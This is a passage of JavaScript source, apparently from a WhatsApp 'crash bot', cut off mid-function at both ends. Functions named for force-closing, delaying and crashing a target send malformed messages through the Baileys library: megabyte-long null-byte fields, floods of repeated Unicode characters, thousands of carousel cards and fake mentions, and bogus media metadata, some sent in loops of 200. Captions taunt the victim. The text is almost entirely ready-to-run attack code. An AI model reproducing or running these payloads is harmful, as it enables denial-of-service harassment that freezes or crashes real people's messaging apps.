
    const videoMsg = {
      key: { remoteJid: target, fromMe: true, id: generateId() },
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/691595026_2893608157644826_187315849843143370_n.enc?ccb=11-4&oh=01_Q5Aa4gEPXnRXehAxfxYOIM2jDLnoIaiGzSJO1_n1oqDY4MJVIA&oe=6A224F5C&_nc_sid=5e03e0&mms3=true",
          directPath: "/v/t62.7161-24/691595026_2893608157644826_187315849843143370_n.enc?ccb=11-4&oh=01_Q5Aa4gEPXnRXehAxfxYOIM2jDLnoIaiGzSJO1_n1oqDY4MJVIA&oe=6A224F5C&_nc_sid=5e03e0",
          mimetype: "video/mp4",
          mediaKey: Buffer.from("k9JgqMYDdU8Hw0bCrc494H0T80Nm0VPKohM7i0HcXp4=", "base64"),
          fileEncSha256: Buffer.from("WAogo1WIlJBMQKpZJjqBVs4eI28GS4RKMlGhEF3SsKU=", "base64"),
          fileSha256: Buffer.from("eATnsaHvcsQu/PVDugim/hyHUxDKy8uETsbToU0I20A=", "base64"),
          fileLength: "20119786",
          mediaKeyTimestamp: "1778043727",
          caption: "FaiqOffc Video FORCLOSE",
          seconds: 30,
          height: 720,
          width: 1280
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage(target, videoMsg.message, {
      participant: { jid: target },
      messageId: videoMsg.key.id
    });

    const groupStatusMsg = {
      key: { remoteJid: target, fromMe: true, id: generateId() },
      message: {
        groupStatusMessageV2: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
              caption: "FaiqOffc Group Status",
              fileLength: "149502",
              height: 1397,
              width: 1126,
              mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
              fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
              directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1777621571",
              jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage(target, groupStatusMsg.message, {
      participant: { jid: target },
      messageId: groupStatusMsg.key.id
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {
      participant: { jid: target }
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      participant: { jid: target }
    });

    const groupStatusMsg2 = {
      key: { remoteJid: target, fromMe: true, id: generateId() },
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "FaiqOffc FORCLOSE",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(50000),
                version: 3
              },
              contextInfo: {
                mentionedJid: [target, "0@s.whatsapp.net"],
                isForwarded: true,
                forwardingScore: 9999
              }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage(target, groupStatusMsg2.message, {
      participant: { jid: target },
      messageId: groupStatusMsg2.key.id
    });

    console.log(`[FORCLOSE BY STAFF JAWA TIMUR] Success: ${target}`);

  } catch (error) {
    console.error(`[FORCLOSE BY STAFF JAWA TIMUR] Error: ${error.message}`);
  }
}


async function JawaTimurDelayTahanLamaxStatus(sock, target) {
  const Track = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  const Location = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  const Mentions = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  for (const msg of [Track, Location, Mentions]) {
    await sock.relayMessage(
      "status@broadcast",
      msg,
      {
        messageId: null,
        statusJidList: [target],
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({}))
        },
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }

  try {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "DitoAttackYou",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });
    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target }
          }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "BOLD"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });
    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target }
          }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };
    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });
    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "KazzAttackYou", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 5600 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function jawaTimurCrash(target) {
  try {
    console.log(`Processing: ${target}`);

    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    for (let i = 0; i < 200; i++) {
      var cards = [];

      for (let v = 0; v < 3; v++) {
        cards.push({
          body: {
            text: "\n".repeat(10) + "ꦾ".repeat(5000)
          },
          footer: {
            text: "\n".repeat(10)
          },
          header: {
            title: "FaiqOffc Attack You",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=", "base64"),
              fileLength: "999999999999999",
              height: 1,
              width: -1,
              mediaKey: Buffer.from("exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=", "base64"),
              fileEncSha256: Buffer.from("D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=", "base64"),
              directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mediaKeyTimestamp: 1755254367,
              jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
              imageSourceType: null
            }
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  display_text: "ោ៝".repeat(5000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  id: null
                })
              },
              {
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_action: "navigate",
                  flow_action_payload: { screen: "WELCOME_SCREEN" },
                  flow_cta: "ꦾ".repeat(10000),
                  flow_id: "yeah, i know, i'm not perfect...",
                  flow_message_version: "9",
                  flow_token: "FaiqOffc Family!"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  copy_code: "ꦾ".repeat(10000)
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  url: "https://t.me/FaiqOffc"
                })
              },
              {
                name: "request_location",
                buttonParamsJson: JSON.stringify({
                  type: "request_location",
                  display_text: "ꦾ".repeat(10000),
                  params: {}
                })
              },
              {
                name: "send_location",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999
            }
          }
        });
      }

      const cv = {
        key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "ꦾ".repeat(26000) },
            footer: { text: "ꦾ".repeat(5000) },
            carouselMessage: { cards: cards },
            contextInfo: {
              stanzaId: null,
              quotedMessage: {
                conversation: "ꦾ".repeat(15000)
              },
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net"]
            }
          }
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(10);

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(750);
    }

    await sock.relayMessage(target, {
      "videoMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
        "mimetype": "video/mp4",
        "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
        "fileLength": "175891",
        "seconds": 1,
        "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
        "height": 848,
        "width": 480,
        "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
        "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
        "mediaKeyTimestamp": "1765345955",
        "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
        "annotations": [{
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMusic": {
              "musicContentMediaId": "3312808138872179",
              "songId": "270259430421407",
              "author": "ြ".repeat(200000),
              "title": " # 🚯 FaiqOffc Freeze ",
              "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
              "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
              "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
              "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
              "countryBlocklist": "",
              "isExplicit": true,
              "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
              "musicSongStartTimeInMs": "10149",
              "derivedContentStartTimeInMs": "0",
              "overlapDurationInMs": "1000"
            }
          },
          "embeddedAction": true
        }]
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await wait(500);

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Maklu Bang".repeat(1000),
              hasMediaAttachment: false
            },
            body: {
              text: ("FaiqOffc Nih Deck\nGoodbye Tolol\n").repeat(10000)
            },
            footer: {
              text: "Kwontol Maklu" + "ꦾ".repeat(99999)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Maklowhhh" + "{".repeat(99999),
                    id: "menu_1"
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "JawaTimur Nih Boss" + "{".repeat(99999),
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true"
                  })
                }
              ]
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target }
    });

    await wait(500);

    const imageMessage = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
      fileLength: 162903,
      height: 1080,
      width: 1080,
      mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
      fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
      directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
      mediaKeyTimestamp: 1775033718,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" },
      scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
      scanLengths: [ 10365, 39303, 40429, 72806 ],
      midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    };

    let cards2 = [];
    for (let z = 0; z < 5000; z++) {
      cards2.push({
        header: { imageMessage, hasMediaAttachment: true },
        nativeFlowMessage: { messageParamsJson: "\0" }
      });
    }

    const Faiq = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const Kaz = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const Dito = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "KAZZ", format: "DEFAULT" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null })
                }
              ],
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Faiq.message, { participant: { jid: target } });
    await sock.relayMessage(target, Kaz.message, { participant: { jid: target } });
    await sock.relayMessage(target, Dito, { participant: { jid: target } });

    console.log(`Done: ${target}`);

  } catch (error) {
    console.error(error.message);
  }
}

async function jawaTimurBlankxForclsoe(target) {
  try {
    console.log(`Processing: ${target}`);

    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "\u0000".repeat(999999) },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({ 
                display_text: "\u0000".repeat(100000), 
                id: null 
              })
            }
          ]
        }
      }
    }, { participant: { jid: target } });

    await wait(300);

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: Buffer.alloc(200000, 0xff)
          },
          interactiveResponseMessage: {
            body: { text: "\u0000".repeat(500000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            }
          }
        }
      }
    }, { participant: { jid: target } });

    await wait(200);

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          protocolMessage: {
            type: 25,
            key: { remoteJid: "status@broadcast", fromMe: true, id: "force_invisible" }
          }
        }
      }
    }, { participant: { jid: target } });

    await wait(100);

    for (let i = 0; i < 200; i++) {
      var cards = [];

      for (let v = 0; v < 3; v++) {
        cards.push({
          body: {
            text: "\n".repeat(10) + "ꦾ".repeat(5000)
          },
          footer: {
            text: "\n".repeat(10)
          },
          header: {
            title: "Attack You",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=", "base64"),
              fileLength: "999999999999999",
              height: 1,
              width: -1,
              mediaKey: Buffer.from("exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=", "base64"),
              fileEncSha256: Buffer.from("D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=", "base64"),
              directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mediaKeyTimestamp: 1755254367,
              jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
              imageSourceType: null
            }
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  display_text: "ោ៝".repeat(5000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  id: null
                })
              },
              {
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_action: "navigate",
                  flow_action_payload: { screen: "WELCOME_SCREEN" },
                  flow_cta: "ꦾ".repeat(10000),
                  flow_id: "yeah, i know, i'm not perfect...",
                  flow_message_version: "9",
                  flow_token: "Family!"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  copy_code: "ꦾ".repeat(10000)
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  url: "https://t.me/Channel"
                })
              },
              {
                name: "request_location",
                buttonParamsJson: JSON.stringify({
                  type: "request_location",
                  display_text: "ꦾ".repeat(10000),
                  params: {}
                })
              },
              {
                name: "send_location",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999
            }
          }
        });
      }

      const cv = {
        key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "ꦾ".repeat(26000) },
            footer: { text: "ꦾ".repeat(5000) },
            carouselMessage: { cards: cards },
            contextInfo: {
              stanzaId: null,
              quotedMessage: {
                conversation: "ꦾ".repeat(15000)
              },
              remoteJid: "status@broadcast",
